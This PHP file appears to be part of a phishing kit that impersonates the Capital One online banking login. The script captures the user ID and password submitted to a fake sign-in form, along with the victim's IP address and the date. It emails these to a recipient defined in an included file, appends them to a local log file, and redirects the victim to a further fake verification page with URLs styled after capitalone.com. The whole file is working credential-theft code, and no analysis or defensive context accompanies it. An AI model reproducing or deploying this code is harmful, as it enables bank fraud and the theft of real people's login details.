<?php
include "../../../x/lock.php";
include "send.php";
ob_start();
session_start();

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message = "=============  Capital Login Info  =============\n";
$message .= "UserID: ".$_SESSION['coid'] = $_POST['coid']."\n";
$message .= "Password: ".$_SESSION['copw'] = $_POST['copw']."\n";
$message .= "================================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Loc: ".$_SESSION['_DIR_']."\n";
$message .= "================================================\n";

function save($arg) {
	$testfile = fopen("../../../a/KMC.txt", "a") or die("Unable to open file!");
	$txt = $arg;
	fwrite($testfile, $txt);
	fclose($testfile);
}

$subject = "Capital One RZT - $ip - Created By KMC +========== HIDE THIS SHIT ==========+";
$headers = "From: CP1\n";
$headers .= "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers)) {
	save($message);
	header("location: ../ver.php?audienceType=MTS_3AKV0LVIE8Z&Log=1&EventType=Link&ComponentType=T&LOB=MTS_L0RT6ME8Z&PageName=Home+Page+Dynamic&PortletLocation=2&ComponentName=header&ContentElement=BSign+In&TargetLob=MTS_LCTMJBE8Z&TargetPageName=Online+Banking+Accounts+Login&referer=www.capitalone.com&homepage-dynamic&external_id=WWW_LP058_XXX_SEM-Brand_Google_ZZ_ZZ_T_Home_ZZ_0ae2464d-60ed-44c8-9235-15b8a82d18bc_25524");
}
else {
	save($message);
	header("location: ../ver.php?audienceType=MTS_3AKV0LVIE8Z&Log=1&EventType=Link&ComponentType=T&LOB=MTS_L0RT6ME8Z&PageName=Home+Page+Dynamic&PortletLocation=2&ComponentName=header&ContentElement=BSign+In&TargetLob=MTS_LCTMJBE8Z&TargetPageName=Online+Banking+Accounts+Login&referer=www.capitalone.com&homepage-dynamic&external_id=WWW_LP058_XXX_SEM-Brand_Google_ZZ_ZZ_T_Home_ZZ_0ae2464d-60ed-44c8-9235-15b8a82d18bc_25524");
}
ob_flush();
?>